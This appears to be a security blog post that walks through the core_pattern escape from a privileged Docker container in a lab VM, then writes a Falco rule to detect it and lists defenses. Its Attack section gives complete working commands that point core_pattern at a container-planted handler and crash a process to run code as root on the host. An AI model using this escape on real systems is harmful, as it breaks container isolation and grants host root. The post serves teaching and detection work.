---
title: "Container Escapes: core_pattern"
categories:
  - notes
  - container
header:
  teaser: /assets/images/posts/container/container-teaser4.jpg
  overlay_image: assets/images/posts/container/container-header3.jpg
  overlay_filter: 0.5
excerpt: "How a privileged container escapes to the host through the kernel's core-dump handler, how Falco sees it, and how to shut it down."
description: "A deep dive into the core_pattern container escape: the usermode-helper mechanism that lets a CAP_SYS_ADMIN container run code as root on the host, runtime detection with Falco, and the isolation defaults that neutralize it."
tags:
  - container
  - container-escapes
  - linux
  - security
  - offensive-security
---

# Intro

This post starts a new series: Container Escapes. Each post takes one escape technique and follows it through the same three phases: attack (run the escape), detect (watch it happen with runtime tooling), defend (the controls that stop it). One technique per post, start to finish.

It follows my earlier container posts, which were about building isolation from scratch (namespaces, cgroups, capabilities, seccomp). This series is about breaking that isolation when it is configured wrong, and then putting it back together.

First technique: the `core_pattern` escape from a privileged container. A few reasons I picked it to open the series. It is not a CVE, it has been public since around 2019, and it still works on a default Docker install. It also shows a specific kernel behavior clearly: sometimes the kernel runs a userspace program on your behalf, as root, and that becomes a problem when a container can choose which program.

## Threat model

The attack requires one misconfiguration: a privileged container.

```sh
docker run --privileged ...
```

`--privileged` turns on several things at once. The container gets the full capability set (including `CAP_SYS_ADMIN`), device access, and a writable `/proc/sys`. This post is about what an attacker does with that last item.

> [!] This does not apply to a default container. A default Docker container drops most caps and mounts `/proc/sys` read-only. The attack assumes someone already handed the container elevated privileges.

A privileged container can escape in several ways. This post covers one of them, `core_pattern`, because the mechanism is easy to follow end to end.

---

# Background: how the kernel runs programs for you

## Usermode helpers

Most of the time the flow is one-way: your process asks the kernel to do things through syscalls. In a few places the kernel needs to run a userspace program to finish a job, and it runs that program from kernel context, as root, in the host's namespaces. This mechanism is called a usermode helper (`call_usermodehelper` in the source).

Some examples that share this pattern:

- `/proc/sys/kernel/modprobe`: the program run when the kernel auto-loads a module.
- `/sys/fs/cgroup/.../release_agent`: the program run when a cgroup empties (cgroup v1). This is the older container escape.
- `/proc/sys/kernel/core_pattern`: the program run to handle a core dump.

Each one is a file whose contents are a command the host kernel will execute as root. If a container can write one of these files and then trigger the matching event, it runs code on the host. `release_agent` is cgroup v1 only and mostly gone on modern systems. `core_pattern` does not depend on cgroups and is still present everywhere.

## core_pattern and core dumps

When a process crashes with a core-generating signal (`SIGSEGV`, `SIGABRT`, and others), the kernel can write a memory image called a core dump. Where it goes is controlled by `/proc/sys/kernel/core_pattern`.

```sh
$ cat /proc/sys/kernel/core_pattern
core
```

That is the default: dump to a file called `core`. The value has a second mode. If it starts with a pipe `|`, the kernel does not write a file. It executes the program named after the pipe and streams the core dump to its stdin.

```sh
# "on any core dump, run /usr/bin/handler with these args"
|/usr/bin/handler %p %s %e
```

The `%` tokens are substitutions (`%p` = pid, `%s` = signal, `%e` = exe name). The relevant behavior is that the kernel executes the program.

> [!] Systems using systemd-coredump, and WSL2 in my case, already ship a pipe handler by default. The pipe syntax is how core dumps are routed on most machines today.

## Why it crosses the container boundary

Two facts make this an escape:

`core_pattern` is a single host-global kernel setting. It is not namespaced, so there is one value for the whole machine, containers included. And the handler it names runs in the host's context: host mount namespace, host PID namespace, real host root.

So a process inside a container that can write `/proc/sys/kernel/core_pattern` is editing the host's setting, not a container-local copy. The next core dump anywhere, including one the attacker triggers inside the container, makes the host kernel execute the attacker's program as root, outside the container.

---

# Attack

## Lab setup

Throwaway VM, default Docker. Do not run this on anything you care about, since it rewrites a host-global kernel setting.

```sh
# confirm this is a default docker: overlay2 storage, no userns-remap
$ docker info --format '{{.Driver}} {{.SecurityOptions}}'
overlay2 [name=seccomp,profile=builtin name=cgroupns]
```

> [!] `name=userns` must not be present. Docker with userns-remap enabled relocates container storage and runs the core-dump helper in a context where this PoC fails (`coredump: ... pipe failed` in dmesg). I cover this in the Defend section. It is why my own WSL2 box refused the escape at first.

Save the host value so we can restore it:

```sh
$ cat /proc/sys/kernel/core_pattern | sudo tee /root/core_pattern.orig
```

Start the vulnerable container:

```sh
$ docker run --rm -it --privileged ubuntu:22.04 bash
```

## Recon

First step inside an unknown container: check how restricted you are. No external tool needed, just `/proc`.

```sh
# how many capabilities do we hold?
root@ctr:/# grep CapEff /proc/self/status
CapEff: 000001ffffffffff
```

`000001ffffffffff` is the full set, every capability. That indicates a privileged container. `CAP_SYS_ADMIN` is included, which is what allows writing kernel sysctls.

```sh
# is /proc/sys writable? (the second precondition)
root@ctr:/# echo test 2>/dev/null > /proc/sys/kernel/core_pattern && echo writable
writable
```

Both preconditions are met: full caps and a writable `/proc/sys`. The rest is mechanics.

## The escape

Three steps: drop a payload, tell the kernel to run it on the next core dump, then cause a core dump.

**1. The payload.** A script that, when run by the host kernel as root, records enough to prove it ran on the host, and leaves the output where the container can read it.

```sh
cat > /handler.sh <<'EOF'
#!/bin/sh
{
  echo "handler ran as: $(id)"
  echo "host uname: $(uname -a)"
  echo "host /etc/hostname: $(cat /etc/hostname)"
  echo "host PID1: $(tr '\0' ' ' < /proc/1/cmdline)"
  echo "host / listing: $(ls /)"
} > /OUTPUT_PLACEHOLDER/proof.txt 2>&1
EOF
chmod +x /handler.sh
```

**2. Find where the container's filesystem lives on the host.** The container root is an overlay mount, and its writable layer (`upperdir`) is a real directory on the host. We can read its host path from our own mount table:

```sh
UPPER=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$UPPER"
# /var/lib/docker/overlay2/<hash>/diff

sed -i "s#/OUTPUT_PLACEHOLDER#$UPPER#" /handler.sh
```

> [!] The `upperdir` works in both directions. A file the host handler writes to `$UPPER/proof.txt` appears inside the container at `/proof.txt`, because that directory is the container's writable layer. It is the same file under two paths.

**3. Arm and fire.** Point `core_pattern` at the handler using its host path, then crash a process.

```sh
echo "|$UPPER/handler.sh" > /proc/sys/kernel/core_pattern

# a tiny program whose only job is to segfault
printf 'int main(){*(volatile int*)0=0;return 0;}' > /crash.c
apt-get install -y gcc >/dev/null 2>&1
gcc -o /crash /crash.c
ulimit -c unlimited
/crash
```

`/crash` dereferences a null pointer, the kernel starts a core dump, sees the pipe in `core_pattern`, and runs our handler as host root.

> [!] On a default host the `#!/bin/sh` handler works, because the usermode helper can resolve `/bin/sh`. If dmesg shows `pipe failed`, compile a static binary instead and point `core_pattern` at that ELF, which needs no interpreter. That is what happened to me on WSL2.

## Proof

Read the file back from inside the container:

```sh
root@ctr:/# cat /proof.txt
handler ran as: uid=0(root) gid=0(root) groups=0(root)
host uname: Linux debian-lab 6.1.0-... x86_64 GNU/Linux
host /etc/hostname: debian-lab
host PID1: /sbin/init
host / listing: bin boot dev etc home lib ... root run sbin srv sys tmp usr var
```

The hostname is the host's, not the container's. PID 1 is the host `init`, not our `bash`. The root listing is the host filesystem. The handler ran as root, outside the container.

From the host you can confirm the kernel invoked the handler:

```sh
$ dmesg | grep -i coredump | tail -1
coredump: 1234(crash): |/var/lib/docker/overlay2/<hash>/diff/handler.sh
```

---

# Detect

Escaping is half the work. If you defend systems, the useful question is whether you would have seen it. So I put [Falco](https://falco.org/) in front of the same attack. Falco is a CNCF runtime-security tool that taps the kernel through an eBPF probe and matches syscall activity against rules.

## Round 1 - default rules

I ran Falco with only its stable default ruleset and repeated the attack. It fired:

```json
{"priority":"Notice","rule":"Terminal shell in container",
 "output":"... process=bash container_image=ubuntu:22.04 ...","source":"syscall"}
```

```json
{"priority":"Critical","rule":"Drop and execute new binary in container",
 "output":"... command=gcc -o /crash /crash.c ... container_name=peaceful_kare ...",
 "tags":["PCI_DSS_11.5.1","TA0003","container","mitre_persistence","process"]}
```

It caught the `bash` shell, and it caught `gcc`/`as`/`ld`/`/crash` under "Drop and execute new binary in container" (one alert per compiler stage).

What it did not catch was the write to `/proc/sys/kernel/core_pattern`. The action that performs the escape produced no alerts. `Launch Privileged Container` did not fire either, because that rule ships disabled in stable (too noisy).

> [!] Worth noting: default Falco detected me compiling and running a new binary, which are side effects of how I wrote the PoC. It did not detect the escape write.

Those side effects are easy to remove. Ship a static prebuilt crasher and there is no compiler step. Crash an existing base-image process (`kill -SEGV` on something already running) and there is no new binary. In that case default Falco produces no alerts while the escape still works. The detection here is incidental.

## A rule that catches the mechanism

The escape is the write to `core_pattern`, so that is what the rule should watch: the file, not the surrounding activity.

```yaml
- rule: Write to core_pattern from container
  desc: >
    A process inside a container opened /proc/sys/kernel/core_pattern for write.
    core_pattern is a host-global sysctl whose pipe handler the kernel executes
    as root on any core dump. Writing it from a container is a privileged-container
    escape primitive (T1611). Stable Falco default rules do not cover this file.
  condition: >
    open_write and container
    and fd.name = /proc/sys/kernel/core_pattern
  output: >
    core_pattern modified from inside a container
    (file=%fd.name proc=%proc.cmdline user=%user.name
     container=%container.name image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

It reuses Falco's built-in `open_write` macro, scopes to `container`, and matches the one path that matters. I added a second, broader rule for the same class (`modprobe` and `release_agent`, the other usermode-helper files), so the coverage is not tied to a single path.

Load it:
```sh
docker run --rm -i --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /etc:/host/etc:ro \
  -v "$PWD/core_pattern_rule.yaml:/etc/falco/rules.d/core_pattern.yaml:ro" \
  falcosecurity/falco:latest \
  falco -o json_output=true -o json_include_output_property=true \
  2>&1 | tee ~/falco-round2.json
```
Run the escape in the other shell, Ctrl-C Falco, then pull the one line:
```sh
grep core_pattern ~/falco-round2.json
```

Now it gets it:

```json
{"priority":"Critical","rule":"Write to core_pattern from container",
 "output":"core_pattern modified from inside a container (file=/proc/sys/kernel/core_pattern proc=bash user=root container=naughty_neumann image=ubuntu:22.04)",
 "output_fields":{"fd.name":"/proc/sys/kernel/core_pattern","proc.cmdline":"bash",
   "container.image.repository":"ubuntu","container.image.tag":"22.04","user.name":"root"},
 "source":"syscall","tags":["T1611","container","escape","mitre_privilege_escalation"]}
```

The escape now raises a CRITICAL alert, on the `echo > core_pattern` line, tagged `T1611` (MITRE: Escape to Host).

## Detection gaps

Being clear about what the rule covers:

- It matches the open-for-write, so it fires the moment `core_pattern` is opened for writing, before any crash is triggered.
- It will not catch a write through a path that does not resolve to `/proc/sys/kernel/core_pattern` as Falco sees it (bind-mount tricks, for example). 

> Falco alerts after the write happens. Stopping the write is the next section.

---

# Defend

## The single misconfiguration

Everything traced back to one flag: `--privileged`. Remove it and the attack has no foothold, because there is no `CAP_SYS_ADMIN` to authorize the sysctl write and `/proc/sys` is read-only. The first defense is simple: do not run privileged containers. Most workloads do not need it.

"Do not misconfigure it" is not enough on its own. Defense in depth means the escape should fail even if one layer is wrong. Here is what each independent control does to this specific attack.

## Layered defenses

```sh
[ Control ]                      [ effect on this escape ]

no --privileged            ->  removes every precondition at once
drop CAP_SYS_ADMIN         ->  the write to core_pattern is denied (EPERM)
read-only / masked /proc   ->  /proc/sys/kernel/core_pattern is not writable
seccomp default profile    ->  blocks neighbouring escape syscalls (init_module...)
no_new_privs               ->  no privilege regain across exec
userns-remap               ->  container root != host root; handler path is unusable
```

To land this escape an attacker needs `CAP_SYS_ADMIN`, a writable `/proc/sys`, and the handler to run in a usable context. Removing any one of these breaks it. The `userns-remap` row is the one that stopped me by accident: my WSL2 Docker had it enabled, so the exploit failed with `pipe failed` until I forced `--userns=host`.

## Defaults done right

Here I will point to my own runtime, [bctor](https://github.com/Johnermac/bctor), which is the reason this series exists. bctor is a from-scratch container runtime I have been building to learn these primitives. Its design rule is that every isolation control is on by default, and weakening it must be an explicit opt-in.

Against this escape, a default bctor container:

- drops `CAP_SYS_ADMIN` and every other capability, so the sysctl write is denied,
- mounts `/proc` read-only and masks the sensitive paths, so there is nothing to write,
- installs a seccomp profile, removing the neighbouring syscalls,
- sets `no_new_privs`.

That is four independent reasons the write never happens, and the workload cannot turn any of them off without an explicit flag.

---

# Conclusion

`core_pattern` is a 20-year-old kernel feature doing what it was designed to do, run a program on a core dump, abused by a container that was given too much privilege. That makes it a good example to learn from:

- The attack is short once you see that `core_pattern` is host-global and the `upperdir` maps both ways.
- The detection is a lesson on its own: the default ruleset caught the noise around my PoC, not the escape. Useful detection watches the mechanism.
- The defense is layered, and the escape fails against any one of five independent controls.

The host and container share one kernel. Most escapes in this space come down to a resource the kernel did not namespace, or a capability that should not have been granted.

> Next in the series I will take another escape through the same attack, detect, defend cycle.

Check the repo: [BCTOR GITHUB REPO](https://github.com/Johnermac/bctor)

> Follow me if this was useful. Hope you liked it! :)

# References

https://github.com/elastic/detection-rules/issues/6216

https://pwning.systems/posts/escaping-containers-for-fun/

https://man7.org/linux/man-pages/man5/core.5.html

https://falco.org/docs/

https://attack.mitre.org/techniques/T1611/
